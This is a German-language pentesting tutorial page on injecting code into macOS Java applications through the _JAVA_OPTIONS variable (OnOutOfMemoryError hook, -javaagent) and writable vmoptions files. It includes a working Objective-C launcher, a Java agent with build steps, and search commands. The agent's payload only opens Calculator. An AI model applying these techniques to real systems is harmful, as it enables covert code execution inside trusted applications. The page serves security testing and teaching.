# macOS Java-Anwendungen Injektion

{{#include ../../../banners/hacktricks-training.md}}

## Aufzählung

Finden Sie Java-Anwendungen, die auf Ihrem System installiert sind. Es wurde festgestellt, dass Java-Apps in der **Info.plist** einige Java-Parameter enthalten, die die Zeichenfolge **`java.`** enthalten, sodass Sie danach suchen können:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Die Umgebungsvariable **`_JAVA_OPTIONS`** kann verwendet werden, um beliebige Java-Parameter in die Ausführung einer Java-kompilierten Anwendung einzufügen:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Um es als neuen Prozess und nicht als Kind des aktuellen Terminals auszuführen, können Sie Folgendes verwenden:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Allerdings wird dadurch ein Fehler in der ausgeführten App ausgelöst, eine andere, stealthy Methode besteht darin, einen Java-Agenten zu erstellen und zu verwenden:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
> [!CAUTION]
> Die Erstellung des Agents mit einer **anderen Java-Version** als der Anwendung kann die Ausführung sowohl des Agents als auch der Anwendung zum Absturz bringen

Wo der Agent sein kann:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Um den Agenten zu kompilieren, führen Sie aus:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Mit `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Und dann exportiere die Umgebungsvariable und führe die Java-Anwendung aus wie:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions-Datei

Diese Datei unterstützt die Spezifikation von **Java-Parametern**, wenn Java ausgeführt wird. Sie könnten einige der vorherigen Tricks verwenden, um die Java-Parameter zu ändern und **den Prozess beliebige Befehle ausführen zu lassen**.\
Darüber hinaus kann diese Datei auch **andere** mit dem `include`-Verzeichnis einfügen, sodass Sie auch eine eingeschlossene Datei ändern könnten.

Noch mehr, einige Java-Anwendungen werden **mehr als eine `vmoptions`-Datei** laden.

Einige Anwendungen wie Android Studio geben in ihrer **Ausgabe an, wo sie nach** diesen Dateien suchen, wie:
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Wenn sie das nicht tun, können Sie es einfach mit folgendem überprüfen:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Beachten Sie, wie interessant es ist, dass Android Studio in diesem Beispiel versucht, die Datei **`/Applications/Android Studio.app.vmoptions`** zu laden, ein Ort, an dem jeder Benutzer aus der **`admin`-Gruppe Schreibzugriff hat.**

{{#include ../../../banners/hacktricks-training.md}}
